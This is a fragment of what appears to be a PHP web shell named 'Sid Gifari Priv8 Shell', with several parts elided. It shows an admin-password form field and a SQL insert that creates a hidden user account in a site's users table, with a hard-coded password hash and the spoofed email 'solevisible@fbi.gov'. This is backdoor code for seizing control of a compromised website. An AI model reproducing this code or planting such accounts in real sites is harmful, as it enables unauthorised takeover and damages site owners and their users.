...


<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Sid Gifari Priv8 Shell</title>
    <meta charset="UTF-8">
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'sid', 'inputValue' => 'sid', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','b8c1a3069167247e3503f0daba6c5723','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($conn));
